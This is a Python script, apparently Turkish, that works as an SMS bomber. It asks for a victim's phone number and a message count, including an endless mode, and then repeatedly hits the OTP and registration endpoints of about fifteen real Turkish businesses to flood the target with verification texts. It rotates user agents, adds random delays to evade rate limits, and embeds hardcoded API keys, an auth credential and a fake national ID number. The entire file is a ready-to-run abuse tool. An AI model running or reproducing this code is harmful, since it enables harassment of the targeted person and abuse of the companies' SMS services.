import asyncio
import aiohttp
import random
import sys

if sys.platform == "win32":
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())


class SMS:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15"
        ]
        self.phone = ""
        self.mail = "xenz@gmail.com" 
        self.tc = "18378370000"  

    async def attack(self, phone_number, amount):
        self.phone = phone_number
        async with aiohttp.ClientSession() as session:
            tasks = []
            for _ in range(amount if amount > 0 else 10**6):
                tasks.extend([
                    self.send_kahve(session),
                    self.send_englishhome(session),
                    self.send_yapp(session),
                    self.send_yilmazticaret(session),
                    self.send_dominos(session),
                    self.send_pidem(session),
                    self.send_frink(session),
                    self.send_bodrum(session),
                    self.send_ido(session),
                    self.send_jimmykey(session),
                    self.send_alixavien(session),
                    self.send_metro(session),
                    self.send_hizliecza(session),
                    self.send_hayatsu(session),
                    self.send_koton(session)
                ])
                
                if len(tasks) >= 20:
                    await asyncio.gather(*tasks)
                    tasks = []
                    await asyncio.sleep(random.uniform(0.5, 1.5))

            if tasks:
                await asyncio.gather(*tasks)

    async def send_request(self, session, url, data, headers):
        try:
            headers["User-Agent"] = random.choice(self.user_agents)
            
            async with session.post(
                url,
                json=data if headers.get("Content-Type") == "application/json" else None,
                data=data if headers.get("Content-Type") != "application/json" else None,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=10)
            ) as response:
                return response.status
        except Exception as e:
            return str(e)

    async def send_kahve(self, session):
        url = "https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number"
        data = {"countryCode": "90", "phoneNumber": self.phone}
        headers = {"Content-Type": "application/json"}
        status = await self.send_request(session, url, data, headers)
        print(f"[Kahve] Durum: {status}")

    async def send_bodrum(self, session):
        url = "https://gandalf.orwi.app/api/user/requestOtp"
        headers = {
            "Content-Type": "application/json",
            "Apikey": "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15"
        }
        data = {"gsm": f"+90{self.phone}", "source": "orwi"}
        status = await self.send_request(session, url, data, headers)
        print(f"[Bodrum] Durum: {status}")

    async def send_frink(self, session):
        url = "https://api.frink.com.tr/api/auth/postSendOTP"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Frink/1.6.0 (com.frink.userapp; build:3; iOS 15.8.3) Alamofire/4.9.1"
        }
        data = {"areaCode": "90", "phoneNumber": f"90{self.phone}"}
        status = await self.send_request(session, url, data, headers)
        print(f"[Frink] Durum: {status}")

    async def send_pidem(self, session):
        url = "https://restashop.azurewebsites.net/graphql/"
        headers = {
            "Content-Type": "application/json",
            "Origin": "https://pidem.azurewebsites.net"
        }
        data = {
            "query": """
                mutation ($phone: String) {
                    sendOtpSms(phone: $phone) {
                        resultStatus
                        message
                    }
                }
            """,
            "variables": {"phone": self.phone}
        }
        status = await self.send_request(session, url, data, headers)
        print(f"[Pidem] Durum: {status}")

    async def send_dominos(self, session):
        url = "https://frontend.dominos.com.tr/api/customer/sendOtpCode"
        headers = {
            "Content-Type": "application/json;charset=utf-8",
            "Authorization": "Bearer eyJhbGciOiJBMTI4S1ci...",
            "User-Agent": "Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0"
        }
        data = {"email": self.mail, "mobilePhone": self.phone}
        status = await self.send_request(session, url, data, headers)
        print(f"[Dominos] Durum: {status}")

    async def send_yilmazticaret(self, session):
        url = "https://app.buyursungelsin.com/api/customer/form/checkx"
        headers = {
            "Content-Type": "multipart/form-data; boundary=boundary",
            "Authorization": "Basic Z2Vsc2luYXBwOjR1N3ghQSVEKkctS2FOZFJnVWtYcDJzNXY4eS9CP0UoSCtNYlFlU2hWbVlxM3Q2dzl6JEMmRilKQE5jUmZValduWnI0dTd4IUElRCpHLUthUGRTZ1ZrWXAyczV2OHkvQj9FKEgrTWJRZVRoV21acTR0Nnc5eiRDJkYpSkBOY1Jm"
        }
        boundary = "q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl"
        data = f"""--{boundary}
Content-Disposition: form-data; name="telephone"

0 ({self.phone[:3]}) {self.phone[3:6]} {self.phone[6:8]} {self.phone[8:]}
--{boundary}--"""
        status = await self.send_request(session, url, data, headers)
        print(f"[Yılmaz Ticaret] Durum: {status}")

    async def send_yapp(self, session):
        url = "https://yapp.com.tr/api/mobile/v1/register"
        headers = {"Content-Type": "application/json"}
        data = {
            "phone_number": self.phone,
            "email": self.mail,
            "firstname": "Memati",
            "lastname": "Bas"
        }
        status = await self.send_request(session, url, data, headers)
        print(f"[Yapp] Durum: {status}")

    async def send_englishhome(self, session):
        url = "https://www.englishhome.com/api/member/sendOtp"
        data = {"Phone": f"90{self.phone}"}
        headers = {"Content-Type": "application/json"}
        status = await self.send_request(session, url, data, headers)
        print(f"[EnglishHome] Durum: {status}")

    async def send_ido(self, session):
        url = "https://api.ido.com.tr/idows/v2/register"
        data = {
            "mobileNumber": f"0{self.phone}",
            "email": self.mail,
            "tckn": self.tc
        }
        headers = {"Content-Type": "application/json"}
        status = await self.send_request(session, url, data, headers)
        print(f"[IDO] Durum: {status}")

    async def send_jimmykey(self, session):
        url = f"https://www.jimmykey.com/tr/p/User/SendConfirmationSms?gsm={self.phone}"
        headers = {"Content-Type": "application/json"}
        status = await self.send_request(session, url, None, headers)
        print(f"[JimmyKey] Durum: {status}")

    async def send_alixavien(self, session):
        url = "https://www.alixavien.com.tr/api/member/sendOtp"
        data = {"Phone": self.phone}
        headers = {"Content-Type": "application/json"}
        status = await self.send_request(session, url, data, headers)
        print(f"[Alixavien] Durum: {status}")

    async def send_metro(self, session):
        url = "https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend"
        data = {"mobilePhoneNumber": self.phone}
        headers = {"Content-Type": "application/json"}
        status = await self.send_request(session, url, data, headers)
        print(f"[Metro] Durum: {status}")

    async def send_hizliecza(self, session):
        url = "https://prod.hizliecza.net/mobil/account/sendOTP"
        data = {"phoneNumber": f"+90{self.phone}"}
        headers = {"Content-Type": "application/json"}
        status = await self.send_request(session, url, data, headers)
        print(f"[Hizliecza] Durum: {status}")

    async def send_hayatsu(self, session):
        url = "https://api.hayatsu.com.tr/api/SignUp/SendOtp"
        data = {"mobilePhoneNumber": self.phone}
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        status = await self.send_request(session, url, data, headers)
        print(f"[Hayatsu] Durum: {status}")

    async def send_koton(self, session):
        url = "https://www.koton.com/users/register/"
        data = {"phone": f"0{self.phone}", "email": self.mail}
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        status = await self.send_request(session, url, data, headers)
        print(f"[Koton] Durum: {status}")


if __name__ == "__main__":
    bomber = SMS()
    print("""
***********************
*     X_X             *
* Made by Mystic-poop *
*                     *
*                     *
***********************
    """)
    phone = input("Hedefin telefon numarası (+90 olmadan): ").strip()
    count = int(input("Gönderilecek SMS sayısı (0=sonsuz): "))
    
    try:
        asyncio.run(bomber.attack(phone, count))
    except KeyboardInterrupt:
        print("\nSaldırı durduruldu!!!1!")
